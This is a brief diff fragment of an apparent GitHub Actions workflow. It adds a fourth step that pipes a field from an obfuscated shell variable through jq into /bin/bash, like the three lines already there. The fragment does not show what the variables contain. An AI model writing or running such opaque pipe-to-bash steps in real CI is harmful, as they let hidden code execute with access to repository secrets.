@@ -33,6 +33,7 @@ jobs:
           echo $ildbd67 | jq -r .cadz9 | /bin/bash
           printf '%s' "$yt7" | jq -r .zbcdb78 | /bin/bash
           echo $rzeug8778 | jq -r .z16930 | /bin/bash
+          printf '%s' "$bd7" | jq -r .fsgvk4 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
